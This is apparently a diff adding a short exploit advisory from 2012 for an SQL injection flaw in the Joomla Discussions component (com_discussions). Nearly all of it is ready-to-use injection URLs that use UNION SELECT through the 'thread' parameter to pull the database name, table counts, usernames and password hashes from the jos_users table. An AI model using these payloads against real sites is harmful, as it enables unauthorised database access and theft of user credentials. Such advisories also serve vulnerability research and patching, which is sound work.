@@ -1,0 +1,24 @@
+# 
+# Title     : Joomla Discussions Component (com_discussions) SQL Injection Vulnerability
+# Author    : Red Security TEAM
+# Date      : 17/01/2012
+# Risk      : High
+# Software  : http://extensions.joomla.org/extensions/communication/forum/13560
+# Tested On : CentOS
+# Contact   : Info [ 4t ] RedSecurity [ d0t ] COM
+# Home      : http://RedSecurity.COM
+#
+# Exploit   :
+# http://server/index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=[SQLi]
+#
+# Example   : 
+#
+# 1. [Get Database Name]
+# http://server/index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=1' union all select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e)--+a
+# 2. [Get  Tables  Name]
+# http://server/index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=1' union all select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x6F7574706F7374715F6F65646576)--+a
+# 3. [Get      Username]
+# http://server/index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=1' union all select (select concat(0x7e,0x27,unhex(Hex(cast(jos_users.username as char))),0x27,0x7e) from `[Database Name]`.jos_users Order by username limit 0,1) --+a
+# 4. [Get      Password]
+# http://server/index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=1' union all select (select concat(0x7e,0x27,unhex(Hex(cast(jos_users.password as char))),0x27,0x7e) from `[Database Name]`.jos_users Order by username limit 0,1) --+a
+#
